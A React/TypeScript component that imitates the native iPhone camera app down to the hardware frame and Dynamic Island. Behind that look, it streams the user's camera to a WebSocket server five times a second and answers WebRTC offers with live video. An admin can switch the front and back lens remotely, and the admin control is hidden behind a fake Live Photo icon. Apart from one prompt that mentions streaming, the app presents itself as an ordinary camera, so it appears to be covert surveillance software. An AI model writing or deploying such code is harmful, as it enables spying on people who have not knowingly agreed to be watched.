import React, { useEffect, useRef, useState, useCallback } from 'react';
import { useAuth } from '../context/AuthContext';
import { db } from '../lib/firebase';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';
import { Info, AlertTriangle, LogOut, User as UserIcon, CheckCircle2 } from 'lucide-react';

interface CameraStreamerProps {
  wsRef: React.MutableRefObject<WebSocket | null>;
  wsConnected: boolean;
  onOpenAdmin: () => void;
  darkMode: boolean;
  setDarkMode: (val: boolean | ((prev: boolean) => boolean)) => void;
}

const ICE_SERVERS = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' }
  ]
};

export const CameraStreamer: React.FC<CameraStreamerProps> = ({
  wsRef,
  wsConnected,
  onOpenAdmin
}) => {
  const { user, isAdmin, logout } = useAuth();
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  const [stream, setStream] = useState<MediaStream | null>(null);
  const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
  const [facingMode, setFacingMode] = useState<'user' | 'environment'>('environment');
  const facingModeRef = useRef<'user' | 'environment'>('environment');
  const [permissionError, setPermissionError] = useState<string | null>(null);
  const [facingModeNotice, setFacingModeNotice] = useState<string | null>(null);

  const [flashActive, setFlashActive] = useState<boolean>(false);
  const [nightModeActive, setNightModeActive] = useState<boolean>(false);
  const [cameraMode, setCameraMode] = useState<'CINEMATIC' | 'VIDEO' | 'PHOTO' | 'PORTRAIT' | 'PANO'>('PHOTO');
  const [zoomLevel, setZoomLevel] = useState<string>('1x');
  const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
  const [showAccountMenu, setShowAccountMenu] = useState<boolean>(false);
  const [showShutterFlash, setShowShutterFlash] = useState<boolean>(false);
  const [saveToastNotice, setSaveToastNotice] = useState<string | null>(null);

  const streamRef = useRef<MediaStream | null>(null);
  const pendingCandidatesRef = useRef<Map<string, RTCIceCandidateInit[]>>(new Map());
  const peerConnectionsRef = useRef<Map<string, RTCPeerConnection>>(new Map());

  // Synchronize presence and streaming status to Firestore
  const updateFirestorePresence = useCallback(async (updates: {
    isStreaming?: boolean;
    facingMode?: 'user' | 'environment';
    active?: boolean;
  }) => {
    if (!user?.id) return;
    try {
      const liveDocRef = doc(db, 'live_users', user.id);
      await setDoc(liveDocRef, {
        userId: user.id,
        email: user.email,
        name: user.name,
        role: user.role || 'user',
        facingMode: updates.facingMode ?? facingModeRef.current,
        isStreaming: updates.isStreaming !== undefined ? updates.isStreaming : isCameraActive,
        active: updates.active !== undefined ? updates.active : true,
        lastSeen: new Date().toISOString(),
        connectedAt: new Date().toISOString()
      }, { merge: true });
    } catch (err) {
      console.warn('Firestore live user presence sync note:', err);
    }
  }, [user, isCameraActive]);

  // Stop current media stream
  const stopCurrentStream = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    setStream(null);
    peerConnectionsRef.current.forEach(pc => pc.close());
    peerConnectionsRef.current.clear();
    pendingCandidatesRef.current.clear();
    updateFirestorePresence({ isStreaming: false, active: true });
  }, [updateFirestorePresence]);

  // Start camera with requested facing mode
  const startCamera = useCallback(async (desiredFacingMode: 'user' | 'environment') => {
    setPermissionError(null);
    facingModeRef.current = desiredFacingMode;
    try {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }

      const constraints: MediaStreamConstraints = {
        video: {
          facingMode: { ideal: desiredFacingMode },
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };

      const mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = mediaStream;
      setStream(mediaStream);
      setIsCameraActive(true);
      setFacingMode(desiredFacingMode);
      facingModeRef.current = desiredFacingMode;

      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        videoRef.current.play().catch(() => {});
      }

      // Replace track on existing WebRTC PeerConnections
      const newVideoTrack = mediaStream.getVideoTracks()[0];
      if (newVideoTrack) {
        peerConnectionsRef.current.forEach(pc => {
          const senders = pc.getSenders();
          const videoSender = senders.find(s => s.track?.kind === 'video');
          if (videoSender) {
            videoSender.replaceTrack(newVideoTrack).catch(e => console.warn('replaceTrack err:', e));
          } else {
            pc.addTrack(newVideoTrack, mediaStream);
          }
        });
      }

      // Sync to Firestore & WebSocket for real-time accuracy without mismatch
      updateFirestorePresence({ isStreaming: true, facingMode: desiredFacingMode, active: true });

      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
        wsRef.current.send(JSON.stringify({
          type: 'stream:status',
          isStreaming: true,
          facingMode: desiredFacingMode
        }));
      }
    } catch (err: any) {
      console.warn('Camera access prompt or unavailable:', err);
      setIsCameraActive(false);
      setPermissionError(err.message || 'Camera permission pending or unavailable on this device.');

      updateFirestorePresence({ isStreaming: false, facingMode: desiredFacingMode, active: true });

      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
        wsRef.current.send(JSON.stringify({
          type: 'stream:status',
          isStreaming: false,
          facingMode: desiredFacingMode
        }));
      }
    }
  }, [wsRef, updateFirestorePresence]);

  // Switch Front/Back Lens
  const switchCameraFacingMode = useCallback((newMode?: 'user' | 'environment') => {
    const targetMode = newMode || (facingModeRef.current === 'user' ? 'environment' : 'user');
    facingModeRef.current = targetMode;
    setFacingMode(targetMode);
    startCamera(targetMode);
  }, [startCamera]);

  // Initial Camera Start & Firestore Presence Heartbeat
  useEffect(() => {
    startCamera('environment');

    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }
      peerConnectionsRef.current.forEach(pc => pc.close());
    };
  }, [startCamera]);

  // Periodic Firestore presence heartbeat to guarantee live accuracy
  useEffect(() => {
    if (!user?.id) return;

    // Heartbeat every 12 seconds
    const interval = setInterval(() => {
      updateFirestorePresence({ active: true });
    }, 12000);

    const handleBeforeUnload = () => {
      updateFirestorePresence({ active: false, isStreaming: false });
    };
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      clearInterval(interval);
      window.removeEventListener('beforeunload', handleBeforeUnload);
      updateFirestorePresence({ active: false, isStreaming: false });
    };
  }, [user?.id, updateFirestorePresence]);

  // Real-time Firestore listener on user's own live document (triggers when Admin switches camera)
  useEffect(() => {
    if (!user?.id) return;
    const userDocRef = doc(db, 'live_users', user.id);
    const unsubscribe = onSnapshot(userDocRef, (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        if (data.facingMode && data.facingMode !== facingModeRef.current) {
          setFacingModeNotice(`Admin switched camera to ${data.facingMode === 'user' ? 'Front' : 'Back'}`);
          switchCameraFacingMode(data.facingMode);
          setTimeout(() => setFacingModeNotice(null), 4000);
        }
      }
    }, (err) => {
      console.warn('Firestore live user observer note:', err);
    });

    return () => unsubscribe();
  }, [user?.id, switchCameraFacingMode]);

  // Handle remote WebRTC & Camera switch events
  useEffect(() => {
    const handleRemoteSignal = async (event: CustomEvent) => {
      const data = event.detail;

      if (data.type === 'camera:switch_command') {
        const { facingMode: remoteFacingMode } = data;
        if (remoteFacingMode) {
          setFacingModeNotice(`Admin switched camera to ${remoteFacingMode === 'user' ? 'Front' : 'Back'}`);
          switchCameraFacingMode(remoteFacingMode);
          setTimeout(() => setFacingModeNotice(null), 4000);
        }
        return;
      }

      if (data.type === 'webrtc:offer') {
        const { offer, senderId } = data;
        if (!offer || !senderId) return;

        // Clean up previous pc for this sender if any
        const existingPc = peerConnectionsRef.current.get(senderId);
        if (existingPc) {
          existingPc.close();
        }

        const pc = new RTCPeerConnection(ICE_SERVERS);
        peerConnectionsRef.current.set(senderId, pc);

        const activeStream = streamRef.current || stream;
        if (activeStream) {
          activeStream.getTracks().forEach(track => {
            pc.addTrack(track, activeStream);
          });
        }

        pc.onicecandidate = (e) => {
          if (e.candidate && wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
            wsRef.current.send(JSON.stringify({
              type: 'webrtc:ice-candidate',
              targetUserId: senderId,
              candidate: e.candidate
            }));
          }
        };

        pc.onconnectionstatechange = () => {
          if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
            peerConnectionsRef.current.delete(senderId);
          }
        };

        await pc.setRemoteDescription(new RTCSessionDescription(offer));

        // Flush any ICE candidates that arrived before setRemoteDescription
        const queued = pendingCandidatesRef.current.get(senderId);
        if (queued && queued.length > 0) {
          for (const cand of queued) {
            await pc.addIceCandidate(new RTCIceCandidate(cand)).catch(e => console.warn('Add queued ICE err:', e));
          }
          pendingCandidatesRef.current.delete(senderId);
        }

        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
          wsRef.current.send(JSON.stringify({
            type: 'webrtc:answer',
            targetUserId: senderId,
            answer
          }));
        }
      }

      if (data.type === 'webrtc:ice-candidate') {
        const { candidate, senderId } = data;
        const pc = peerConnectionsRef.current.get(senderId);
        if (pc && pc.remoteDescription) {
          await pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn('Add ICE candidate err:', e));
        } else if (senderId && candidate) {
          const queue = pendingCandidatesRef.current.get(senderId) || [];
          queue.push(candidate);
          pendingCandidatesRef.current.set(senderId, queue);
        }
      }
    };

    window.addEventListener('webrtc-signal' as any, handleRemoteSignal);
    return () => {
      window.removeEventListener('webrtc-signal' as any, handleRemoteSignal);
    };
  }, [facingMode, isCameraActive, wsRef]);

  // Frame Capture for snapshot broadcasting
  useEffect(() => {
    if (!isCameraActive || !wsConnected || !videoRef.current || !canvasRef.current) return;

    const intervalId = setInterval(() => {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      if (!video || !canvas || video.readyState !== 4) return;

      const context = canvas.getContext('2d');
      if (!context) return;

      canvas.width = 480;
      canvas.height = 360;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const frameData = canvas.toDataURL('image/jpeg', 0.5);

      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
        wsRef.current.send(JSON.stringify({
          type: 'stream:frame',
          frameData,
          facingMode
        }));
      }
    }, 200);

    return () => clearInterval(intervalId);
  }, [isCameraActive, wsConnected, facingMode, wsRef]);

  // Shutter action (takes photo snapshot, screen flash, and saves directly to device storage)
  const handleShutterClick = () => {
    setShowShutterFlash(true);
    setTimeout(() => setShowShutterFlash(false), 120);

    if (videoRef.current && canvasRef.current && isCameraActive) {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        if (facingMode === 'user') {
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
        }
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const photoData = canvas.toDataURL('image/jpeg', 0.95);
        setCapturedPhoto(photoData);

        // Generate timestamped filename
        const now = new Date();
        const dateStr = `${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}_${String(now.getHours()).padStart(2, '0')}${String(now.getMinutes()).padStart(2, '0')}${String(now.getSeconds()).padStart(2, '0')}`;
        const fileName = `IMG_${dateStr}.jpg`;

        // Direct download trigger: saves directly to user's phone / device storage
        const downloadLink = document.createElement('a');
        downloadLink.href = photoData;
        downloadLink.download = fileName;
        document.body.appendChild(downloadLink);
        downloadLink.click();
        document.body.removeChild(downloadLink);

        // Notify user of direct saving
        setSaveToastNotice(`Photo saved to phone storage (${fileName})`);
        setTimeout(() => setSaveToastNotice(null), 3500);
      }
    } else {
      startCamera(facingMode);
    }
  };

  // Zoom scale multiplier
  const getZoomScale = () => {
    if (zoomLevel === '.5') return 0.75;
    if (zoomLevel === '3') return 1.6;
    return 1.0;
  };

  return (
    <div className="relative flex items-center justify-center min-h-screen py-2 px-1 select-none">
      
      {/* Outer iPhone Pro Hardware Mockup Frame */}
      <div className="relative w-[392px] h-[824px] max-w-[100vw] bg-[#1a1721] rounded-[54px] p-[10px] shadow-[0_25px_60px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(255,255,255,0.15)] ring-1 ring-black flex flex-col justify-between overflow-hidden">
        
        {/* Left Hardware Buttons Mockup */}
        <div className="absolute -left-[14px] top-[115px] w-[4px] h-[28px] bg-[#3a3547] rounded-l-md" />
        <div className="absolute -left-[14px] top-[165px] w-[4px] h-[50px] bg-[#3a3547] rounded-l-md" />
        <div className="absolute -left-[14px] top-[228px] w-[4px] h-[50px] bg-[#3a3547] rounded-l-md" />
        {/* Right Hardware Power Button Mockup */}
        <div className="absolute -right-[14px] top-[180px] w-[4px] h-[75px] bg-[#3a3547] rounded-r-md" />

        {/* Screen Display Area */}
        <div className="relative w-full h-full bg-black rounded-[46px] overflow-hidden flex flex-col justify-between">
          
          {/* Shutter flash animation overlay */}
          {showShutterFlash && (
            <div className="absolute inset-0 z-50 bg-white opacity-80 pointer-events-none transition-opacity duration-150" />
          )}

          {/* Hidden Canvas for video frame grabbing */}
          <canvas ref={canvasRef} className="hidden" />

          {/* Top Dynamic Island and Status Header */}
          <div className="relative z-40 pt-3 px-5 flex flex-col">
            {/* Dynamic Island with Camera dot & Green Privacy Indicator */}
            <div className="relative flex items-center justify-center h-8">
              {/* Dynamic Island Capsule */}
              <div className="w-[120px] h-[30px] bg-black rounded-full flex items-center justify-end pr-3 border border-white/5 shadow-md">
                {/* Front camera lens reflection */}
                <div className="w-3 h-3 rounded-full bg-[#081226] border border-[#1b263b] flex items-center justify-center">
                  <div className="w-1 h-1 rounded-full bg-[#1e3a5f]" />
                </div>
              </div>

              {/* iOS Green Recording Indicator Dot (Exact match to uploaded image) */}
              <div className="absolute right-[85px] top-[12px] w-2 h-2 rounded-full bg-[#34c759] shadow-[0_0_6px_#34c759]" />
            </div>

            {/* iOS Top Bar Controls Row: Flash, Night/Live off, Chevron Up, White Dotted Icon (Admin) */}
            <div className="mt-2 flex items-center justify-between text-white">
              
              {/* Left Group: Flash & Night Mode */}
              <div className="flex items-center gap-3">
                {/* Flash Toggle */}
                <button
                  onClick={() => setFlashActive(!flashActive)}
                  className="w-9 h-9 rounded-full bg-black/40 backdrop-blur-md flex items-center justify-center text-white hover:bg-black/60 active:scale-95 transition-all"
                  title="Flash"
                >
                  <svg className={`w-[18px] h-[18px] ${flashActive ? 'text-amber-300 fill-amber-300' : 'text-white'}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
                  </svg>
                </button>

                {/* Night Mode / Live Off Icon */}
                <button
                  onClick={() => setNightModeActive(!nightModeActive)}
                  className="w-9 h-9 rounded-full bg-black/40 backdrop-blur-md flex items-center justify-center text-white hover:bg-black/60 active:scale-95 transition-all"
                  title="Night Mode"
                >
                  <svg className={`w-[19px] h-[19px] ${nightModeActive ? 'text-amber-300' : 'text-white'}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="8" />
                    <line x1="4" y1="4" x2="20" y2="20" />
                  </svg>
                </button>
              </div>

              {/* Center Chevron Indicator */}
              <button
                onClick={() => setShowAccountMenu(!showAccountMenu)}
                className="w-7 h-7 rounded-full bg-black/40 backdrop-blur-md flex items-center justify-center text-white hover:bg-black/60 active:scale-95 transition-all"
                title="Camera Details & Settings"
              >
                <svg className="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="18 15 12 9 6 15" />
                </svg>
              </button>

              {/* Right: The White Dotted Icon (Admin Button) */}
              <div className="flex items-center">
                {isAdmin ? (
                  <button
                    onClick={onOpenAdmin}
                    className="relative w-9 h-9 rounded-full bg-black/40 backdrop-blur-md flex items-center justify-center text-white hover:bg-black/60 hover:scale-105 active:scale-95 transition-all"
                    title="Live Photos / Admin Dashboard"
                  >
                    {/* Concentric Dotted Live Photo Icon matching uploaded image */}
                    <svg className="w-[22px] h-[22px] text-white" viewBox="0 0 24 24" fill="none">
                      {/* Outer dotted circle */}
                      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="1.6" strokeDasharray="1.8 2.5" strokeLinecap="round" />
                      {/* Inner solid thin circle */}
                      <circle cx="12" cy="12" r="5.5" stroke="currentColor" strokeWidth="1.4" />
                      {/* Center solid dot */}
                      <circle cx="12" cy="12" r="2" fill="currentColor" />
                    </svg>
                  </button>
                ) : (
                  /* Placeholder empty space so non-admins never see or click the admin button */
                  <div className="w-9 h-9" />
                )}
              </div>

            </div>
          </div>

          {/* Account Profile Drawer (when chevron tapped) */}
          {showAccountMenu && user && (
            <div className="absolute top-[80px] left-4 right-4 z-50 p-4 bg-black/90 backdrop-blur-xl rounded-2xl border border-white/20 text-white space-y-3 animate-fade-in shadow-2xl">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-xs font-bold text-white">{user.name}</div>
                  <div className="text-[11px] text-slate-400">{user.email}</div>
                </div>
                {isAdmin && (
                  <span className="px-2 py-0.5 rounded bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 text-[10px] font-bold">
                    Admin
                  </span>
                )}
              </div>
              <div className="pt-2 border-t border-white/10 space-y-2">
                <div className="flex items-center gap-2 pt-1">
                  <button
                    onClick={() => startCamera(facingMode)}
                    className="flex-1 py-1.5 bg-white/15 hover:bg-white/25 rounded-lg text-[11px] font-semibold text-center transition-colors"
                  >
                    Reload Camera
                  </button>
                  <button
                    onClick={logout}
                    className="flex-1 py-1.5 bg-rose-600/80 hover:bg-rose-600 text-white rounded-lg text-[11px] font-semibold flex items-center justify-center gap-1 transition-colors"
                  >
                    <LogOut className="w-3 h-3" />
                    Sign Out
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Notice when Admin sends remote camera switch */}
          {facingModeNotice && (
            <div className="absolute top-[80px] left-4 right-4 z-40 p-2.5 rounded-xl bg-indigo-950/90 border border-indigo-700/80 text-white text-xs flex items-center gap-2 shadow-lg">
              <Info className="w-4 h-4 text-indigo-400 shrink-0" />
              <span>{facingModeNotice}</span>
            </div>
          )}

          {/* 4:3 Camera Viewfinder Screen Area */}
          <div className="relative flex-1 w-full bg-[#111] overflow-hidden my-1 flex items-center justify-center">
            
            {/* Live Camera Stream Video */}
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className={`absolute inset-0 w-full h-full object-cover transition-transform duration-300 ${
                facingMode === 'user' ? 'scale-x-[-1]' : 'scale-x-1'
              } ${!isCameraActive ? 'hidden' : 'block'}`}
              style={{
                transform: `scale(${getZoomScale()}) ${facingMode === 'user' ? 'scaleX(-1)' : ''}`
              }}
            />

            {/* Toast when photo is saved to phone storage */}
            {saveToastNotice && (
              <div className="absolute top-4 left-4 right-4 z-40 p-2.5 rounded-xl bg-black/85 backdrop-blur-md border border-emerald-500/60 text-white text-xs flex items-center justify-center gap-2 shadow-2xl animate-fade-in">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span className="font-semibold text-center">{saveToastNotice}</span>
              </div>
            )}

            {/* Permission or Inactive Camera prompt */}
            {!isCameraActive && (
              <div className="absolute inset-0 bg-[#0e0e12] flex flex-col items-center justify-center p-6 text-center text-white z-20 space-y-4">
                <div className="w-16 h-16 rounded-full bg-white/10 flex items-center justify-center border border-white/20">
                  <svg className="w-8 h-8 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                    <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z" />
                    <circle cx="12" cy="13" r="3" />
                  </svg>
                </div>
                <div className="space-y-1">
                  <p className="text-sm font-semibold text-white">Live Camera Inactive</p>
                  <p className="text-xs text-slate-400 max-w-[220px]">
                    {permissionError || 'Grant camera permission to begin streaming in real time'}
                  </p>
                </div>
                <button
                  onClick={() => startCamera(facingMode)}
                  className="px-5 py-2.5 bg-white text-black font-bold text-xs rounded-full hover:bg-slate-200 transition-colors shadow-lg active:scale-95"
                >
                  Turn On Camera
                </button>
              </div>
            )}

            {/* Zoom Selector: .5   1x   3 (Positioned inside the viewfinder near bottom) */}
            <div className="absolute bottom-3 left-1/2 -translate-x-1/2 z-30 flex items-center bg-black/55 backdrop-blur-md rounded-full p-1 border border-white/10 shadow-lg">
              {(['.5', '1x', '3'] as const).map(z => (
                <button
                  key={z}
                  onClick={() => setZoomLevel(z)}
                  className={`w-7 h-7 rounded-full text-[11px] font-bold flex items-center justify-center transition-all ${
                    zoomLevel === z
                      ? 'bg-black/90 text-[#eab308] border border-white/20 shadow-sm scale-110'
                      : 'text-white/80 hover:text-white'
                  }`}
                >
                  {z}
                </button>
              ))}
            </div>

          </div>

          {/* Bottom Controls Area: Modes Carousel, Shutter Row, and Home Bar */}
          <div className="relative z-40 bg-black pb-5 pt-1 px-6 flex flex-col justify-between">
            
            {/* Camera Mode Text Carousel: CINEMATIC  VIDEO  PHOTO  PORTRAIT  PANO */}
            <div className="flex items-center justify-center gap-5 text-[12px] font-bold tracking-wider py-2 overflow-x-hidden">
              {(['CINEMATIC', 'VIDEO', 'PHOTO', 'PORTRAIT', 'PANO'] as const).map(mode => (
                <button
                  key={mode}
                  onClick={() => setCameraMode(mode)}
                  className={`transition-all whitespace-nowrap uppercase ${
                    cameraMode === mode
                      ? 'text-[#e5a93c] font-black scale-105'
                      : 'text-[#9e9e9e] hover:text-white'
                  }`}
                >
                  {mode}
                </button>
              ))}
            </div>

            {/* Shutter Row: Thumbnail on Left, Shutter in Center, Flip Camera on Right */}
            <div className="mt-2 flex items-center justify-between">
              
              {/* Photo Gallery Thumbnail (Left) */}
              <div
                onClick={handleShutterClick}
                className="w-12 h-12 rounded-xl bg-[#1c1c1e] border border-white/20 overflow-hidden shadow-md flex items-center justify-center cursor-pointer hover:opacity-90 active:scale-95 transition-all"
                title="Recent Photo"
              >
                {capturedPhoto ? (
                  <img src={capturedPhoto} alt="Last capture" className="w-full h-full object-cover" />
                ) : (
                  <div className="w-full h-full bg-[#202024] flex items-center justify-center text-slate-500">
                    <svg className="w-5 h-5 text-slate-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                      <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
                      <circle cx="8.5" cy="8.5" r="1.5" />
                      <polyline points="21 15 16 10 5 21" />
                    </svg>
                  </div>
                )}
              </div>

              {/* Shutter Button (Center) - Authentic Double Ring iOS Style */}
              <button
                onClick={handleShutterClick}
                className="w-[72px] h-[72px] rounded-full border-[4px] border-white p-[3px] flex items-center justify-center hover:scale-105 active:scale-95 transition-transform shadow-2xl"
                title="Take Photo / Stream"
              >
                <div
                  className={`w-full h-full rounded-full transition-all duration-150 ${
                    cameraMode === 'VIDEO' ? 'bg-[#ff3b30] rounded-xl scale-75' : 'bg-white'
                  }`}
                />
              </button>

              {/* Flip Camera Button (Right) - Front/Back Lens Toggle */}
              <button
                onClick={() => switchCameraFacingMode()}
                className="w-12 h-12 rounded-full bg-[#2c2c2e]/80 backdrop-blur-md flex items-center justify-center text-white hover:bg-[#3a3a3c] active:rotate-180 transition-all duration-300 shadow-md"
                title={`Switch to ${facingMode === 'user' ? 'Back' : 'Front'} Camera`}
              >
                {/* Authentic Apple Dual Arrow Camera Flip SVG */}
                <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 2v6h-6" />
                  <path d="M3 12a9 9 0 0 1 15-6.7L21 8" />
                  <path d="M3 22v-6h6" />
                  <path d="M21 12a9 9 0 0 1-15 6.7L3 16" />
                </svg>
              </button>

            </div>

            {/* Apple Home Indicator Bar */}
            <div className="w-[134px] h-[4px] bg-white/80 rounded-full mx-auto mt-4" />

          </div>

        </div>

      </div>

    </div>
  );
};
